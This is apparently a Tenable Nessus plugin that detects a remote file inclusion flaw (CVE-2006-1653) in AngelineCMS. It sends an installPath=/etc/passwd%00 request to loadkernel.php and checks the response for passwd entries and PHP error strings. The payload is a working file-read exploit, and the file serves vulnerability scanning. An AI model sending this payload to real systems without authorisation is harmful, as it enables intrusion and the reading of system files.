#
# (C) Tenable Network Security, Inc.
#



include("compat.inc");

if (description)
{
  script_id(21185);
  script_version("$Revision: 1.11 $");

  script_cve_id("CVE-2006-1653");
  script_bugtraq_id(17371);
  script_xref(name:"OSVDB", value:"24610");

  script_name(english:"AngelineCMS loadkernel.php installPath Variable Remote File Inclusion");
  script_summary(english:"Tries to read /etc/passwd using AngelineCMS");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is susceptible to
remote file include attacks." );
 script_set_attribute(attribute:"description", value:
"The remote host is running AngelineCMS, an open-source content
management system written in PHP. 

The version of AngelineCMS installed on the remote host fails to
sanitize user-supplied input to the 'installPath' parameter of the
'/kernel/loadkernel.php' script before using it in a PHP
'include_once()' function.  Provided PHP's 'register_globals' setting
is enabled, an unauthenticated attacker may be able to exploit this
issue to view arbitrary files on the remote host or to execute
arbitrary PHP code, possibly taken from third-party hosts." );
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?a0a70a23" );
 script_set_attribute(attribute:"solution", value:
"Unknown at this time." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P" );
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006-2009 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0);


# Loop through various directories.
if (thorough_tests) dirs = list_uniq(make_list("/angeline", "/cms", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  # Try to exploit one of the flaws to read a file.
  file = "/etc/passwd%00";
  r = http_send_recv3(method:"GET", port: port,
    item:string(
      dir, "/kernel/loadkernel.php?",
      "installPath=", file));
  if (isnull(r)) exit(0);
  res = r[2];

  # There's a problem if...
  if (
    # there's an entry for root or...
    egrep(pattern:"root:.*:0:[01]:", string:res) ||
    # we get an error saying "failed to open stream" or "failed opening".
    #
    # nb: this suggests magic_quotes_gpc was enabled but an attacker with
    #     local access and/or remote file inclusion might still work.
    egrep(pattern:"main\(/etc/passwd\\0/kernel/common/time\.php.+ failed to open stream", string:res) ||
    egrep(pattern:"Failed opening '/etc/passwd\\0/kernel/common/time\.php'", string:res) ||
    # we get an error claiming the file doesn't exist or...
    egrep(pattern:"main\(/etc/passwd\).*: failed to open stream: No such file or directory", string:res) ||
    # we get an error about open_basedir restriction or...
    egrep(pattern:"main.+ open_basedir restriction in effect. File\(/etc/passwd", string:res)
  )
  {
    if (egrep(string:res, pattern:"root:.*:0:[01]:"))
      contents = res - strstr(res, "<br />");

    if (isnull(contents)) security_hole(port);
    else
    {
      report = string(
        "\n",
        "Here are the contents of the file '/etc/passwd' that\n",
        "Nessus was able to read from the remote host :\n",
        "\n",
        contents
      );
      security_hole(port:port, extra:report);
    }
    exit(0);
  }
}
